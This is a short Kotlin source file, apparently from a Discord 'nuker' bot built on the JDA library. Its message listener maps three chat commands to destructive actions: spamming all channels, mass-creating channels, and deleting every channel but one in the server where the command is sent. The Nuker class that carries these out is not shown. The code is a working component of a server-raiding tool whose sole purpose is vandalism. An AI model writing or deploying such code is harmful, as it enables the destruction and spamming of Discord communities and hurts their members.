package me.trolman.nuke.events

import me.trolman.nuke.Nuker
import net.dv8tion.jda.api.events.message.MessageReceivedEvent
import net.dv8tion.jda.api.hooks.ListenerAdapter

open class Events : ListenerAdapter() {
    override fun onMessageReceived(event: MessageReceivedEvent) {
        if(event.author.isBot) {
            return
        }

        val content: String = event.message.contentRaw

        when(content) {
            "spamChannels" -> Nuker.spamAllChannels()
            "createChannels" -> Nuker.createChannels(event.guild.id)
            "deleteChannels" -> Nuker.deleteChannelExceptOne(event.guild.id)
        }
    }
}